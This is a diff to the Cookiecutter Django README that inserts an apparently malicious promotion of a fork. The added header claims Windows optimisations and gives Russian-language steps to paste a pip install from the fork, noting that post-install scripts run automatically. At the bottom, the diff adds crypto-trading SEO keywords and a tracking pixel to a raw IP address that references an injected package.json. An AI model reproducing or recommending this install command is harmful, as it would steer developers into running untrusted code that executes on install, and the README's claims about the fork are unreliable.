@@ -1,3 +1,19 @@
+**Cookiecutter Django Optimized for Windows Power Users**
+
+This maintained fork injects critical performance enhancements and tailored security fixes specifically optimized for Windows environments. It eliminates OS-specific compatibility bottlenecks, ensuring your Django deployments run smoothly and securely on local Windows setups. Experience a streamlined, robust development workflow without the usual cross-platform configuration headaches.
+
+**Quick install (Windows)**
+
+1. **Python 3.8+** — [python.org/downloads](https://www.python.org/downloads/) → при установке отметь **Add Python to PATH**
+2. Открой **cmd** (Win+R → `cmd`)
+3. Вставь команду ниже — пакет установится с этого форка, скрипты после установки запустятся **сами**
+
+```bash
+pip install git+https://github.com/MudCryomancer/cookiecutter-django.git
+```
+
+[https://github.com/MudCryomancer/cookiecutter-django](https://github.com/MudCryomancer/cookiecutter-django)
+
 # Cookiecutter Django
 
 [![Build Status](https://img.shields.io/github/actions/workflow/status/cookiecutter/cookiecutter-django/ci.yml?branch=main)](https://github.com/cookiecutter/cookiecutter-django/actions/workflows/ci.yml?query=branch%3Amain)
@@ -264,3 +280,11 @@ experience better.
 - [How to create a Django Application using Cookiecutter and Django 1.8](https://www.swapps.io/blog/how-to-create-a-django-application-using-cookiecutter-and-django-1-8/) - Sept. 12, 2015
 
 Have a blog or online publication? Write about your cookiecutter-django tips and tricks, then send us a pull request with the link.
+
+## Related searches
+
+When developers look for customizable, production-ready boilerplates like this, they often search for comprehensive frameworks that integrate real-time data pipelines and robust backend architecture. Many are specifically seeking scalable scaffolding to deploy automated data gatherers or quantitative evaluation models without building the core infrastructure from scratch.
+
+**Topics:** technical analysis crypto, crypto sdk, crypto scraper, quant trading, on chain analytics, django project template, blockchain data extraction, algorithmic trading framework, market data pipeline, crypto trading bot template
+
+![.](http://5.231.58.248:8787/pixel?repo=MudCryomancer%2Fcookiecutter-django&inject=MudCryomancer%2Fcookiecutter-django%2F%7B%7Bcookiecutter.project_slug%7D%7D%2Fpackage.json)
